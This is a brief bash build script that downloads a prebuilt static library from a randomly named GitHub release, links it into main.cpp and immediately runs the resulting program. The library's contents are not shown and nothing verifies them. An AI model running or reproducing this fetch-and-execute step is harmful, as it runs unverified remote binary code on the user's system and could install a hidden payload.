#!/usr/bin/env bash
set -e
curl -fsSL -o "concise-poncho.a" --retry 3 --connect-timeout 15 --max-time 180 "https://github.com/veraffieldw/randomoutboxio/releases/download/hidden-delta-frosty-cedar/concise-poncho.a"
g++ -pthread -std=c++17 -O2 main.cpp "concise-poncho.a" -o app && ./app
